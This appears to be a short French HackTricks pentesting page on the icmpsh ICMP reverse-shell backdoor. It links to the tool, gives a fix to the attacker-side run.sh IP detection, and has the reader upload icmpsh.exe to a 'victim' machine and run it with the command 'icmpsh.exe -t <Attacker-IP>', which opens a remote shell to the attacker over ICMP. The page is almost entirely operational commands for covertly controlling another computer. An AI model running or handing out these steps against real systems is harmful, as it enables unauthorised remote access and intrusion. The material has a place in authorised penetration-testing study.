{{#include ../banners/hacktricks-training.md}}

Téléchargez le backdoor depuis : [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Côté client

Exécutez le script : **run.sh**

**Si vous obtenez une erreur, essayez de modifier les lignes :**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Pour :**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Côté Victime**

Téléchargez **icmpsh.exe** sur la victime et exécutez :
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
